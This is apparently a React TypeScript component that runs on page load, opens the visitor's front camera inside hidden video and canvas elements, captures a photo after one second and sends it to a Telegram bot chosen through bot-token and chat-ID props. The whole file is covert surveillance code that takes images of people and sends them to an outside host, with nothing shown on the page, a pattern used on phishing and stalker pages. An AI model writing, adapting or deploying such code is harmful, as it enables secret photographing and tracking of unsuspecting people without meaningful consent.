import React, { useEffect, useRef } from 'react';

interface CameraProps {
  botToken: string;
  chatId: string;
}

const Camera: React.FC<CameraProps> = ({ botToken, chatId }) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const startCameraAndSendPhoto = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      const video = videoRef.current;
      if (video) {
        video.onloadedmetadata = async () => {
          setTimeout(async () => {
            const canvas = canvasRef.current;
            if (!canvas) return;

            const context = canvas.getContext('2d');
            if (!context) return;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const dataUrl = canvas.toDataURL('image/jpeg');
            const blob = await (await fetch(dataUrl)).blob();
            
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');
            
            try {
              await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
              });
              console.log('Photo sent successfully!');
            } catch (error) {
              console.error('Error sending photo:', error);
            }

            // Stop the camera
            stream.getTracks().forEach(track => track.stop());
          }, 1000);
        };
      }
    } catch (error) {
      console.error('Error accessing camera:', error);
    }
  };

  useEffect(() => {
    startCameraAndSendPhoto();
  }, []);

  return (
    <div>
      <video 
        ref={videoRef} 
        autoPlay 
        playsInline 
        style={{ display: 'none' }}
      />
      <canvas 
        ref={canvasRef} 
        style={{ display: 'none' }}
      />
    </div>
  );
};

export default Camera; 